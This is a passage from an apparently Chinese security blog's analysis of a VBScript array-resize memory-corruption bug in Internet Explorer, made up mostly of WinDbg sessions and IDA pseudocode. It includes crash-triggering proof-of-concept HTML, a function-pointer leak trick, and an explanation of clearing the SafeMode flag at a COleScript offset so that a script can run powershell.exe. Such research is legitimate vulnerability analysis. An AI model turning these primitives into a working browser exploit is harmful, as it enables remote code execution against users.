IsEmpty("test")</span><br><span class="line">    i = func</span><br><span class="line">    i = null</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">0:012&gt; bu vbscript!VbsIsEmpty</span><br><span class="line">0:012&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:012&gt; g</span><br><span class="line">Tue Jun 25 22:45:29.396 2019 (GMT+8): ModLoad: 6b6f0000 6b75b000   C:\Windows\system32\vbscript.dll</span><br><span class="line">Tue Jun 25 22:45:29.396 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6b6f185c ebx=023fd6d4 ecx=6b74a9d8 edx=023fd64c esi=00d7a8d8 edi=00000001</span><br><span class="line">eip=6b70c206 esp=023fd568 ebp=023fd578 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6b70c206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; dd poi(esp+c) l4</span><br><span class="line">0052fe50  00000008 00000000 00d7a8c4 00000000</span><br><span class="line">0:005&gt; du 00d7a8c4</span><br><span class="line">00d7a8c4  &quot;test&quot;</span><br><span class="line">0:005&gt; ba w4 0052fe50</span><br><span class="line">0:005&gt; ba w4 0052fe50+8</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 22:46:27.584 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=0052fe50 ebx=023fd6d4 ecx=00000000 edx=0000400c esi=00d7a8b0 edi=00000010</span><br><span class="line">eip=6b6f322c esp=023fd594 ebp=023fd67c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!CScriptRuntime::RunNoEH+0xeaf:</span><br><span class="line">6b6f322c 8d4594          lea     eax,[ebp-6Ch]</span><br><span class="line">0:005&gt; dd 0052fe50 l4</span><br><span class="line">0052fe50  00000000 00000000 00d7a8c4 00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 22:46:53.012 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=00000000 ebx=023fd704 ecx=0052f448 edx=00d7a8b8 esi=0052f610 edi=0052fe54</span><br><span class="line">eip=6b6f2b24 esp=023fd52c ebp=023fd534 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vbscript!NameTbl::GetAdrCore+0x2b:</span><br><span class="line">6b6f2b24 a5              movs    dword ptr es:[edi],dword ptr [esi] es:0023:0052fe54=00000000 ds:0023:0052f610=000007ff</span><br><span class="line">0:005&gt; dd 0052fe50 l4</span><br><span class="line">0052fe50  0000004c 00000000 00d7a8c4 00000000</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 22:47:07.785 2019 (GMT+8): Breakpoint 2 hit</span><br><span class="line">eax=00000000 ebx=023fd704 ecx=0052f448 edx=00d7a8b8 esi=0052f618 edi=0052fe5c</span><br><span class="line">eip=6b6f2b26 esp=023fd52c ebp=023fd534 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vbscript!NameTbl::GetAdrCore+0x2d:</span><br><span class="line">6b6f2b26 a5              movs    dword ptr es:[edi],dword ptr [esi] es:0023:0052fe5c=00000000 ds:0023:0052f618=f60000f6</span><br><span class="line">0:005&gt; dd 0052fe50 l4</span><br><span class="line">0052fe50  0000004c 000007ff 0052fe98 00000000</span><br><span class="line">0:005&gt; dd 0052fe98 l4</span><br><span class="line">0052fe98  6b6f4934 00000001 0052f7a8 00d7a878</span><br><span class="line">0:005&gt; ln 6b6f4934</span><br><span class="line">(6b6f4934)   vbscript!CScriptEntryPoint::`vftable&apos;   |  (6b70ab54)   vbscript!CEntryPointDispatch::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    vbscript!CScriptEntryPoint::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; dd poi(poi(0052fe98+0x8)+0x10) l4</span><br><span class="line">0052f100  6b6f4868 6b6f4ab4 6b6f4410 6b6f43f8</span><br><span class="line">0:005&gt; ln 6b6f4868</span><br><span class="line">(6b6f4868)   vbscript!COleScript::`vftable&apos;   |  (6b70fdbc)   vbscript!`string&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    vbscript!COleScript::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 22:51:28.415 2019 (GMT+8): Breakpoint 1 hit</span><br><span class="line">eax=0052fe50 ebx=023fd6d4 ecx=00000001 edx=023fd540 esi=00000000 edi=80020102</span><br><span class="line">eip=6b6f3faf esp=023fd594 ebp=023fd67c iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">vbscript!CScriptRuntime::RunNoEH+0x79d:</span><br><span class="line">6b6f3faf e99ce8ffff      jmp     vbscript!CScriptRuntime::RunNoEH+0x156 (6b6f2850)</span><br><span class="line">0:005&gt; dd 0052fe50 l4</span><br><span class="line">0052fe50  00000001 000007ff 0052fe98 f60000f6</span><br></pre></td></tr></table></figure><p>调试时，通过<code>IsEmpty</code>找到当前求值栈的栈顶地址为<code>0x0052fe50</code>,此时栈顶存放的<code>VARIANT</code>类型为<code>0x8</code> <code>VT_BSTR</code>，数据段存放的是”func”字符串的地址。随后对求值栈的类型字段和数据段下写断点<code>ba w4 0046fbb8</code>, <code>ba w4 0046fbb8+8</code>.在执行到<code>i=func</code>时，解释器会先获取<code>func</code>函数的地址，然后封装成<code>VARIANT</code>类型放到求值栈上，可以看到<code>0x4c</code>对应的类型为<code>VT_FUNC</code>。随后准备进行赋值操作，但是在赋值检查类型时，发现求值栈中的是函数地址，会直接返回错误，不会执行赋值操作。但poc中又设置了<code>On Error Resume Next</code>，所以会向下继续执行<code>i=null</code>。 而在准备<code>null</code>的<code>VARIANT</code>类型时，解释器并不是将新封装的<code>VARIANT</code>类型放到求值栈中，而仅仅是将求值栈里面的类型域修改成了<code>VT_NULL</code>，<code>0x1</code>，然后赋值给<code>i</code>。数据域中依然保留的是<code>func</code>的地址。最终变量<code>i</code>保存了<code>func</code>函数的地址。而通过观察发现，该地址其实是<code>CScriptEntryPoint</code>对象的指针。</p><h3 id="6-SafeMode-GodMode"><a href="#6-SafeMode-GodMode" class="headerlink" title="6. SafeMode(GodMode)"></a>6. SafeMode(GodMode)</h3><p>SafeMode 是 Windows 操作系统中针对安全的一种特殊模式，即安全模式。在 vbscript 引擎中同样存在这样一个安全属性值，正常情况下该属性值为 <code>0xE</code>。默认情况下 vbscript 脚本执行权限是非常低的，正是因为safemode 安全属性的限制，如若我们能通过一定方法修改掉此属性值（改为 0 或者 4），即可绕过安全权限检查，为所欲为，即进入上帝模式。而且，经过调试发现在 <code>COleScript</code> 对象偏移 <code>0x174</code>(不同版本可能偏移不一样) 位置正是 SafeMode标志位(结论记住就行，前人逆向出来的经验)。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"vbscript"</span>&gt;</span></span><br><span class="line">    on error resume next</span><br><span class="line">    set shell = createobject("shell.application")</span><br><span class="line">    shell.shellexecute "powershell.exe"</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>正常情况下，上面poc是无法弹出<code>powershell.exe</code>的。在 IE 中打开，使用 windbg 附加进程后调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bu vbscript!COleSCript::InSafeMode</span><br><span class="line">0:005&gt; g</span><br><span class="line">Fri Jun 21 16:39:37.292 2019 (GMT+8): Breakpoint 3 hit</span><br><span class="line">eax=75af0782 ebx=00000000 ecx=02247740 edx=75ae0000 esi=02249828 edi=00000000</span><br><span class="line">eip=6c71ce4d esp=0223cef8 ebp=0223cf80 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">vbscript!COleScript::InSafeMode:</span><br><span class="line">6c71ce4d f781740100000b000000 test dword ptr [ecx+174h],0Bh ds:0023:022478b4=0000000e</span><br><span class="line">0:005&gt; dd ecx+174 L4</span><br><span class="line">022478b4  0000000e 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:005&gt; eb ecx+174 0</span><br><span class="line">0:005&gt; dd ecx+174 L4</span><br><span class="line">022478b4  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>可以看到，在 <code>InSafeMode</code> 函数中，会检查 <code>0x174</code> 偏移处的值与 <code>0xB(1011)</code> 的 <strong>与</strong> 结果。如果结果为 <code>0</code>， 则vbscript的执行将不再收到限制。故此时值应该为 <code>0</code> 或者 <code>4(0100)</code> 才行。手动在调试器中修改内存值，便可弹出cmd。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞成因分析"><a href="#漏洞成因分析" class="headerlink" title="漏洞成因分析"></a>漏洞成因分析</h3><p>先看一个简化版的poc:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    On Error Resume Next</span><br><span class="line">    dim arrayA()</span><br><span class="line">    dim arrayB()</span><br><span class="line">    dim size</span><br><span class="line">    dim over</span><br><span class="line">    size = &amp;h5</span><br><span class="line">    over = &amp;h8000000 + size</span><br><span class="line">    redim Preserve arrayA(size)</span><br><span class="line"></span><br><span class="line">    IsEmpty(arrayA)</span><br><span class="line"></span><br><span class="line">    redim arrayB(size)</span><br><span class="line">    redim Preserve arrayA(over)</span><br><span class="line">    arrayA(size+1) = 5</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>windbg 打开堆调试开关：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;gflags.exe /i iexplore.exe +hpa -ust</span><br><span class="line">Current Registry Settings for iexplore.exe executable are: 02000000</span><br><span class="line">    hpa - Enable page heap</span><br></pre></td></tr></table></figure><p>IE 运行 poc 时用windbg 附加上，可以看到崩溃信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">Mon Jun 24 11:06:29.036 2019 (GMT+8): (86c.848): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=0000400c ebx=04ea7000 ecx=0000400c edx=00000002 esi=00000010 edi=00000001</span><br><span class="line">eip=68512e78 esp=041bcfd4 ebp=041bcffc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">vbscript!AssignVar+0x14:</span><br><span class="line">68512e78 66390b          cmp     word ptr [ebx],cx        ds:0023:04ea7000=????</span><br><span class="line"></span><br><span class="line">vbscript!AssignVar:</span><br><span class="line">68512e64 8bff            mov     edi,edi</span><br><span class="line">68512e66 55              push    ebp</span><br><span class="line">68512e67 8bec            mov     ebp,esp</span><br><span class="line">68512e69 83ec20          sub     esp,20h</span><br><span class="line">68512e6c 53              push    ebx</span><br><span class="line">68512e6d 8b5d0c          mov     ebx,dword ptr [ebp+0Ch]</span><br><span class="line">68512e70 b80c400000      mov     eax,400Ch</span><br><span class="line">68512e75 8bc8            mov     ecx,eax</span><br><span class="line">68512e77 56              push    esi</span><br><span class="line">68512e78 66390b          cmp     word ptr [ebx],cx        ds:0023:04ea7000=????</span><br><span class="line">68512e7b 0f841f9f0000    je      vbscript!AssignVar+0x19 (6851cda0)</span><br></pre></td></tr></table></figure><p>可以看到，执行到 <code>eip=68512e78</code> 时，在读取<code>ebx</code>指向的内存时出错。查看 <code>ebx</code> 指向的内存是如何申请的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a ebx</span><br><span class="line">    address 04ea7000 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 1f1000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 4dd14e0:          4ea6ef0              110 -          4ea6000             2000</span><br><span class="line">    6d178e89 verifier!AVrfDebugPageHeapAllocate+0x00000229</span><br><span class="line">    6d1792b2 verifier!AVrfDebugPageHeapReAllocate+0x000001a2</span><br><span class="line">    77796153 ntdll!RtlDebugReAllocateHeap+0x00000033</span><br><span class="line">    7775e46c ntdll!RtlReAllocateHeap+0x00000054</span><br><span class="line">    775aee32 ole32!CRetailMalloc_Realloc+0x00000025</span><br><span class="line">    7784ed3c OLEAUT32!SafeArrayRedim+0x00000153</span><br><span class="line">    685258da vbscript!RedimPreserveArray+0x00000081</span><br><span class="line">    68525887 vbscript!CScriptRuntime::RunNoEH+0x00001466</span><br><span class="line">    68514ff6 vbscript!CScriptRuntime::Run+0x00000064</span><br><span class="line">    68514f79 vbscript!CScriptEntryPoint::Call+0x00000051</span><br><span class="line">    6851512b vbscript!CSession::Execute+0x000000c8</span><br><span class="line">    6851536e vbscript!COleScript::ExecutePendingScripts+0x00000146</span><br><span class="line">    68520e4a vbscript!COleScript::ParseScriptTextCore+0x00000247</span><br><span class="line">    685193e8 vbscript!COleScript::ParseScriptText+0x0000002b</span><br></pre></td></tr></table></figure><p>通过<code>!heap -p -a ebx</code> 可以看到是 <code>vbscript!RedimPreserveArray</code> 申请到的。上 IDA 分析 <code>vbscript.dll</code>:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">stdcall <span class="title">RedimPreserveArray</span><span class="params">(SAFEARRAY *psa, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, struct VAR *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SAFEARRAY *v3; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">unsigned</span> __int16 *v4; <span class="comment">// eax@3</span></span><br><span class="line">  VAR *v5; <span class="comment">// edi@6</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// esi@6</span></span><br><span class="line">  __int32 v7; <span class="comment">// [sp-10h] [bp-20h]@0</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">VAR</span> *<span class="title">v8</span>;</span> <span class="comment">// [sp-Ch] [bp-1Ch]@0</span></span><br><span class="line">  SAFEARRAYBOUND psaboundNew; <span class="comment">// [sp+8h] [bp-8h]@2</span></span><br><span class="line">  SAFEARRAY *psaa; <span class="comment">// [sp+18h] [bp+8h]@2</span></span><br><span class="line"></span><br><span class="line">  v3 = psa;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != psa-&gt;cDims )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  psaboundNew.lLbound = <span class="number">0</span>;</span><br><span class="line">  psaboundNew.cElements = *((_DWORD *)VAR::PvarGetTypeVal(a3, <span class="number">3</span>) + <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">  psaa = (SAFEARRAY *)<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (struct VAR *)((<span class="keyword">char</span> *)a3 + <span class="number">16</span>);</span><br><span class="line">    v6 = (<span class="keyword">int</span>)&amp;v3[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> ( !*(_DWORD *)(v6 + <span class="number">4</span>) &amp;&amp; *(_DWORD *)v6 == *((_DWORD *)VAR::PvarGetTypeVal(v5, <span class="number">3</span>) + <span class="number">2</span>) + <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      psaa = (SAFEARRAY *)((<span class="keyword">char</span> *)psaa + <span class="number">1</span>);</span><br><span class="line">      v6 += <span class="number">8</span>;</span><br><span class="line">      v5 = (VAR *)((<span class="keyword">char</span> *)v5 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)psaa &gt;= a2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_5:</span><br><span class="line">    RaiseErrorHr(<span class="number">-2146828279</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_3:</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">unsigned</span> __int16 *)SafeArrayRedim(v3, &amp;psaboundNew);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v4 &lt; <span class="number">0</span> )</span><br><span class="line">    RaiseErrorHr(v7, v8, v4, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过分析，在函数 <code>RedimPreserveArray</code> 中又调用 <code>aoleaut32</code> 模块中的 <code>SafeArrayRedim</code>函数。其中，<code>v3</code> 也就是 <code>psa</code>类型为 <code>SAFEARRAY</code>, 表示带调整的数组，<code>psaboundNew</code>类型为 <code>SAFEARRAYBOUND</code>，表示待调整的数组大小。</p><p>关闭之前开启的堆调试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;gflags.exe /i iexplore.exe -hpa</span><br><span class="line">Current Registry Settings for iexplore.exe executable are: 00000000</span><br></pre></td></tr></table></figure><p>修改下之前的POC，增加<code>IsEmpty</code>用于辅助调试：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">LANGUAGE</span>=<span class="string">"VBScript"</span>&gt;</span></span><br><span class="line">    On Error Resume Next</span><br><span class="line">    dim arrayA()</span><br><span class="line">    dim arrayB()</span><br><span class="line">    dim size</span><br><span class="line">    dim over</span><br><span class="line">    size = &amp;h5</span><br><span class="line">    over = &amp;h8000000 + size</span><br><span class="line">    redim Preserve arrayA(size)</span><br><span class="line"></span><br><span class="line">    IsEmpty(arrayA)</span><br><span class="line"></span><br><span class="line">    redim arrayB(size)</span><br><span class="line">    redim Preserve arrayA(over)</span><br><span class="line">    IsEmpty(arrayA)</span><br><span class="line">    arrayA(size+1) = 5</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调试上面poc，使用IE打开poc后附加 IE 进程，在<code>vbscript!VbsIsEmpty</code>对 <code>IsEmpty</code>下断点进行调试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; bu vbscript!VbsIsEmpty</span><br><span class="line">0:013&gt; bl</span><br><span class="line"> 0 eu             0001 (0001) (vbscript!VbsIsEmpty)</span><br><span class="line">0:005&gt; g</span><br><span class="line">Tue Jun 25 14:39:48.836 2019 (GMT+8): Breakpoint 0 hit</span><br><span class="line">eax=6a2d185c ebx=024ad034 ecx=6a32a9d8 edx=024acfac esi=01f8a088 edi=00000001</span><br><span class="line">eip=6a2ec206 esp=024acec8 ebp=024aced8 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">vbscript!VbsIsEmpty:</span><br><span class="line">6a2ec206 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; kv 2</span><br><span class="line">ChildEBP RetAddr  Args to Child</span><br><span class="line">024acec4 6a2d3854 024acfac 00000001 003dfb00 vbscript!VbsIsEmpty (FPO: [3,0,0])</span><br><span class="line">024aced8 6a2d586e 024acfac 00000001 003dfb00 vbscript!StaticEntryPoint::Call+0x11 (FPO: [5,0,0])</span><br><span class="line">0:005&gt; dd 003dfb00 l4</span><br><span class="line">003dfb00  0000600c 00000000 01f87798 0010d850</span><br><span class="line">0:005&gt; dt tagVARIANT 003dfb00 vt wReserved1 wReserved2 wReserved3 pparray</span><br><span class="line">ole32!tagVARIANT</span><br><span class="line">   +0x000 vt         : 0x600c</span><br><span class="line">   +0x002 wReserved1 : 0</span><br><span class="line">   +0x004 wReserved2 : 0</span><br><span class="line">   +0x006 wReserved3 : 0</span><br><span class="line">   +0x008 pparray    : 0x01f87798  -&gt; 0x0010d850 tagSAFEARRAY</span><br><span class="line">0:005&gt; dd 01f87798 l4</span><br><span class="line">01f87798  0010d850 00000000 00000000 08cfd360</span><br><span class="line">0:005&gt; dd 0010d850 l8</span><br><span class="line">0010d850  08800001 00000010 00000000 000e5a28</span><br><span class="line">0010d860  00000006 00000000 53aee65f 88000000</span><br><span class="line">0:005&gt; dt tagSAFEARRAY 0010d850</span><br><span class="line">ole32!tagSAFEARRAY</span><br><span class="line">   +0x000 cDims            : 1</span><br><span class="line">   +0x002 fFeatures        : 0x880</span><br><span class="line">   +0x004 cbElements       : 0x10</span><br><span class="line">   +0x008 cLocks           : 0</span><br><span class="line">   +0x00c pvData           : 0x000e5a28</span><br><span class="line">   +0x010 rgsabound        : [1] tagSAFEARRAYBOUND</span><br><span class="line">0:005&gt; dt tagSAFEARRAYBOUND 0010d850 + 0x10</span><br><span class="line">UxTheme!tagSAFEARRAYBOUND</span><br><span class="line">   +0x000 cElements        : 6</span><br><span class="line">   +0x004 lLbound          : 